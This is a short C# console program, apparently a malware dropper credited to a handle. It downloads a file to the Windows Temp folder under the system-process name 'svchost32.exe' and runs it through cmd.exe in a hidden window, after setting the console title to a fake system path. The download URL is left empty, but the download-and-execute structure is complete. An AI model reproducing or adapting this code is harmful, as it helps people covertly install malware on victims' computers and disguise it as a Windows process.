using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.Net.NetworkInformation;

namespace runme
{
    class Program
    {
        static void Main(string[] args)
        {
            //MADE BY L0LERMAQN12
            try
            {
                Console.Title = @"C:\Windows\System32\sysdrop32.exe";
                WebClient webec = new WebClient();
                webec.DownloadFile("", @"C:\Windows\Temp\svchost32.exe");
            }
            catch
            {
                Console.WriteLine("No internet connection/Application Error");
                Console.Beep();
                Thread.Sleep(1000);
                Environment.Exit(0);
            }
            Console.WriteLine("File Dropped succesfully");
            Thread.Sleep(600);
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = @"cmd.exe";
            ps.Arguments = @"/c C:\Windows\Temp\svchost32.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(ps);

        }
    }
}
